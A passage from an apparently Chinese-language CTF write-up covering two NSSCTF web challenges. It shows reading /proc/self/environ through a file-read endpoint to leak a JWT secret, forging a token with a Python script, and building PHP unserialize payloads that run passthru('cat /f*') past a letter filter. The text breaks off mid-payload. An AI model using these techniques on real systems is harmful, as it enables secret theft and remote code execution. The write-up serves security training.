class="line">&#123;</span><br><span class="line">  &quot;UserRegistration&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;,</span><br><span class="line">  &quot;UserLogin&quot;: &#123; &quot;username&quot;, &quot;password&quot; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用BP注册一个账户先:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/register HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;a&quot;,&quot;password&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure><img src="ddb0bc5ed20228a85676ba21ed691acd.png" alt="ddb0bc5ed20228a85676ba21ed691acd.png" /><p>login 一下</p><img src="ceb050b212f68f02ec7f1146781f49e8.png" alt="ceb050b212f68f02ec7f1146781f49e8.png" /><p>用以下的cookie:<br>拋去jwt.io:</p><img src="9bb2273710f6ca2f594de0e6ea7f537b.png" alt="9bb2273710f6ca2f594de0e6ea7f537b.png" /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api-base/v0/search   HTTP/1.1</span><br><span class="line">Host: node5.anna.nssctf.cn:21401</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwYXNzd29yZCI6ImEifQ.BN9dROQHEp6L0iPx03SgsNO2c3rGac428_lCXh4E2ig</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">If-None-Match: &quot;1708337513.0-4226-1006306968&quot;</span><br><span class="line">If-Modified-Since: Mon, 19 Feb 2024 10:11:53 GMT</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure><img src="352dfcac48a77da66e3bb9065d9a1305.png" alt="352dfcac48a77da66e3bb9065d9a1305.png" /><p>盲猜一下這是flask寫的 , file &#x3D; app.py </p><img src="ea6506e3ad4c28e8926ab4ccfca1a780.png" alt="ea6506e3ad4c28e8926ab4ccfca1a780.png" /><br/><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="variable language_">self</span>.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="variable language_">self</span>.username, <span class="string">&#x27;password&#x27;</span>: <span class="variable language_">self</span>.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>找到admin的信息了 , {“username”:”admin” , “password”:”password”} 再&#x2F;readflag</p><p>只要用户名是Plato 密码是ideal_state 就可以得到flag，但是它无法登录，也无法注册</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br></pre></td></tr></table></figure><p>要目录穿透?a&#x3D;..&#x2F;..&#x2F;..&#x2F;???????</p><img src="11d98589587d850441e418378bf25e39.png" alt="11d98589587d850441e418378bf25e39.png" /><p>留意一下這一句:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br></pre></td></tr></table></figure><p>這一句是指在linux下的&#x2F;proc&#x2F;self&#x2F;environ有放key , 可以在?file&#x3D; &#x2F;proc&#x2F;self&#x2F;environ找到</p><p>最後在&#x2F;proc&#x2F;self&#x2F;environ 找到了KEY</p><img src="5643d3d71c222dfc43591b4449fed24c.png" alt="5643d3d71c222dfc43591b4449fed24c.png" /><p>SECRET_KEY&#x3D;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r</p><p>這樣就可以jwt偽造了 , </p><img src="1b29cf97eba9760613949894d4a72e3f.png" alt="1b29cf97eba9760613949894d4a72e3f.png" /><p>簡單寫一下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;Plato&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;ideal_state&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成token</span></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, SECRET_KEY, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlBsYXRvIiwicGFzc3dvcmQiOiJpZGVhbF9zdGF0ZSJ9.LpctUZCUocsntlZ7kNWh9KsagP4CMcELs_bt1g_4A-M</span><br></pre></td></tr></table></figure><h2 id="29-Maxser-Revenge"><a href="#29-Maxser-Revenge" class="headerlink" title="29.Maxser Revenge"></a>29.Maxser Revenge</h2><p>是一個php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;check.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&#x27;notion&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;S);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">check</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">来吧，湮灭极限!</span><br></pre></td></tr></table></figure><p>是一個反序列化php </p><p>來打開phpstudy 生成 NSS的參數</p><p>目標是eval(system(“ls &#x2F;“))</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>() ;</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;system(&#x27;ls /&#x27;)&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize($a) ;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="2ba80e6f30589677a856d9ad50d69064.png" alt="2ba80e6f30589677a856d9ad50d69064.png" /><p>发现有正则绕过“&#x2F;[A-Za-z_$()]+&#x2F;” 需要过滤字母:</p><p>16進制轉文本:<br><img src="572046fd972c87d3ee5775239a1d7d79.png" alt="572046fd972c87d3ee5775239a1d7d79.png" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;passthru&quot;:2:&#123;s:1:&quot;S&quot;;s:14:\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x20\x2f\x27\x29;s:3:&quot;dir&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>hex還是字母 , </p><p>看了看其他師傅的wp , passthru可以进行命令执行 , ls中l转16进制不行 就直接cat &#x2F;f*</p><p>(&#x2F;和可以直接用，不用转16进制)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\70\61\73\73\74\68\72\75\28\27\63\61\74\20/\66*\27\29;</span><br></pre></td></tr></table></figure><img src="a4785abc923a2e43feb01011e377f5d4.png" alt="a4785abc923a2e43feb01011e377f5d4.png" /><p>构造payload,记得s:19:要改为S:19:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">passthru</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">passthru</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;S = <span class="string">&quot;passthru(&#x27;cat /f*&#x27;);&quot;</span> ;</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#echo  base64_encode(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;passthru&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span 